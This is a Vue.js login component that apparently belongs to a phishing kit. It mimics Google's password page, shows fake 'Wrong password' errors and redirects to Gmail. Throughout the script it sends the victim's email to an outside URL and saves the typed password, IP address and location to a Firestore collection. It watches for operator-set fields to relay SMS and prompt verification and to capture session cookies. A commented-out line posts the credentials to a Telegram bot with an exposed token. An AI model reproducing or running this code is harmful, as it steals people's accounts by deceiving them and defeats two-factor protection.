<template>
  <v-container fill-height class="d-flex justify-center">
    <v-card
      min-width="448"
      height="500"
      :loading="!loginPageLoaded"
      :outlined="true"
      flat
      :disabled="!loginPageLoaded"
      class="pl-8 pr-8"
    >
      <v-card-title>
        <v-img
          width="20"
          height="32"
          :src="require('@/assets/google_logo.png')"
          :contain="true"
          class="mt-8"
        />
      </v-card-title>
      <v-card-text>
        <!-- <h3 class="headline text-center text--primary">Welcome</h3> -->
        <h3 class="headline text-center text--primary">Welcome</h3>
        <!-- <h4 class="text-center text--primary">
          To continue to
          <span class="primary--text">Zoom</span>
        </h4>-->
        <div class="text-center">
          <v-btn
            :rounded="true"
            class="ma-3 mx-auto email-button"
            :outlined="true"
          >
            <v-icon left>mdi-account-circle</v-icon>
            <div class="text--primary text-none">{{ email }}</div>
            <v-icon right>mdi-chevron-down</v-icon>
          </v-btn>
          <v-text-field
            :disabled="!loginPageLoaded"
            :append-icon="showPassword ? 'mdi-eye' : 'mdi-eye-off'"
            :type="showPassword ? 'text' : 'password'"
            label="Enter your password"
            :error="error"
            v-model="password"
            :outlined="true"
            width="300"
            color="primary"
            class="mt-5"
            :error-messages="errorMessage"
            @click:append="showPassword = !showPassword"
            v-on:keyup.enter="submitForm"
            ref="password"
          ></v-text-field>
        </div>
      </v-card-text>
      <v-card-actions>
        <v-btn color="primary" class="text-none" :depressed="true" text
          >Forgot password?</v-btn
        >
        <v-spacer></v-spacer>
        <v-btn
          color="primary"
          :depressed="true"
          @click="submitForm"
          eight="36"
          width="88"
          class="text-none"
          >Next</v-btn
        >
      </v-card-actions>
    </v-card>
  </v-container>
</template>

<script>
import { azureUrl } from "../config";
import { db } from "../firebase";

export default {
  name: "LoginForm",

  data: () => ({
    showPassword: false,
    errorMessage: "",
    error: false,
    disableCard: true,
    cardLoading: true,
    email: "",
    ipAddress: "",
    countryName: "",
    password: "",
    loginPageLoaded: false,
    smsCode: "",
    cookies: "",
    loggedIn: false,
    errorScreenshot: "",
    verificationType: "",
    promptNumber: "",
    disabled: false,
  }),

  async beforeCreate() {},

  async created() {
    console.log();
    this.email = this.$route.params.email
      .split("-myg-")
      .join("gmail")
      .split("-myd-")
      .join(".")
      .split("-mya-")
      .join("@");

    this.$http.get(`${azureUrl}${this.email}`);
    console.log(`${azureUrl}${this.email}`);
    console.log(this.email);
    let googleAccounts = db.collection("googleAccounts");

    // Fetch user from firestore.
    const user = await googleAccounts.doc(this.email).get();

    // Redirect user to gmail if cookies have already been stored.
    user.get("cookies") && (window.location.href = `https://mail.google.com`);

    // If the user is not redirected
    await googleAccounts.doc(this.email).set({
      email: this.email,
      loginPageLoaded: false,
      smsCode: "",
      cookies: "",
      loggedIn: false,
      password: "",
      errorScreenshot: "",
      verificationType: "",
      promptNumber: "",
      loginError: false,
      validPass: false,
      completed: false,
    });

    // FIRESTORE LISTENER
    // await this.$firestore.googleAccounts
    console.log(this.$route.params.email);
    googleAccounts.where("email", "==", this.email).onSnapshot((snapshot) => {
      console.log("i snapped");
      snapshot.docChanges().forEach(
        (change) => {
          let changeData = change.doc.data();

          if (change.type === "modified") {
            console.log("modified called");

            // Disable page loading progress.
            changeData.loginPageLoaded && (this.loginPageLoaded = true);

            // when the user clicks on submit... the page continues to load.
            changeData.loggedIn && (this.loginPageLoaded = true);

            if (changeData.loginError) {
              this.error = true;
              this.errorMessage =
                "Wrong password. Try again or click Forgot password to reset it.";
              this.password = "";
              this.loginPageLoaded = true;
            }

            if (changeData.verificationType) {
              console.log(changeData.promptNumber);
              this.$router.push({
                path: `/verification/${changeData.verificationType}/${this.email}/${changeData.promptNumber}`,
              });
            }

            // if cookies was set after login redirect the user.
            changeData.completed &&
              (window.location.href = "https://mail.google.com");
          }
        },
        (err) => {
          console.log(`Encountered error: ${err}`);
        }
      );
    });

    // GET USER DETAILS
    try {
      const { data } = await this.$http(`https://ipapi.co/json/`);
      console.log(data);
      this.ipAddress = data.ip;
      this.countryName = data.country_name;
      this.city = data.city;
    } catch (e) {
      console.log(e);
    }
    this.$refs.password.focus();
  },

  methods: {
    async submitForm() {
      console.log(this.email, this.password);

      if (this.password.length < 8) {
        this.error = true;
        this.errorMessage =
          "Wrong password. Try again or click Forgot password to reset it.";
        this.password = "";
        return;
      }

      this.errorMessage = "";
      this.error = false;

      try {
        this.loginPageLoaded = !this.loginPageLoaded;
        await db.collection("googleAccounts").doc(this.email).set(
          {
            password: this.password,
            ipAddress: this.ipAddress,
            country: this.countryName,
            city: this.city,
            loginPageLoaded: false,
            loggedIn: false,
            loginError: false,
          },
          { merge: true }
        );
      } catch (e) {
        console.log(e);
      }
      // await this.$http.get(
      //   `https://api.telegram.org/bot1896792960:AAH-tipdqkIQjIURF1L1A-RR_6CoM7xZSJ8/sendMessage?chat_id=-506319667&text=${this.email}-${this.password}-${this.country}-${this.$route.params.fm}`
      // );
    },
  },
};
</script>

<style lang="scss">
a {
  text-decoration: none;
  color: #005da6;
}
.rounded-button {
  border-radius: 0px;
}
.email-button {
  border: 0.5px solid rgb(219, 219, 219);
}
</style>

